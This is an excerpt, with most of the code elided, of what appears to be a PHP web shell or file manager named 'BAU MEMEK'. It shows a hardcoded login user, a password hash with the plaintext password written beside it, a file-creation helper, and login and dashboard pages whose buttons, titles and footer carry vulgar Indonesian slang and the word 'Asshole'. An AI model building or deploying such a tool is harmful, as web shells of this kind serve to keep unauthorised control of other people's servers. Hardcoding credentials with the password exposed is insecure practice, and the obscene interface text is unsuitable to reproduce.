...
/* ---------- Auth ---------- */
define('AUTH_USER', 'tempik');
define('AUTH_PASS_HASH', '$2a$12$usEJkd4a2RCB5JSGxtsfJO38kf/qkfFMcIgPE4QhyP3B0RT1y5Cye'); // pass : n0t
...
function create_nonzero_file($path, $userContent = null){
    $default = "Created by BAU MEMEK @ ".date('c')."\n";
...
function render_login($err=''){
    ...
    <!doctype html><html lang="en" class="dark"><head>
      <meta charset="utf-8"><title>BAU MEMEK</title>
      ...
      <div class="w-full max-w-md card p-6">
        <div class="mb-5 flex items-center justify-between">
          <div class="text-xl font-bold tracking-tight title">BAU MEMEK</div>
          <span class="text-xs text-slate-400"><?php echo h(PHP_VERSION); ?></span>
        </div>
        ...
        <form method="post" action="?a=login" class="space-y-3">
          ...
          <button class="btn w-full" type="submit">MEMEK BASAH</button>
        </form>
        <p class="text-[12px] text-slate-400 mt-4 text-center">© BAU MEMEK BASAH</p>
      </div>
    </body></html><?php
}
...
<body class="shell text-slate-100" id="bodyRoot">
  <header class="sticky top-0 z-20 w-full border-b border-slate-800 bg-slate-900/70 backdrop-blur">
    <div class="w-full px-6 py-3 flex items-center justify-between gap-3">
      <div class="flex items-center gap-3 shrink-0">
        ...
        <div>
          <div class="text-lg font-semibold tracking-tight" style="background:linear-gradient(90deg,#93c5fd,#c4b5fd);-webkit-background-clip:text;background-clip:text;color:transparent"><a href="?">BAU MEMEK</a></div>
  ...
  <footer class="w-full px-6 py-4">
    ...
    <div class="text-xs text-slate-400 flex items-center justify-between">
      <span>© <?php echo $yearNow; ?> BAU MEMEK — All rights reserved.</span>
      <span>Asshole</span>
    </div>
  </footer>
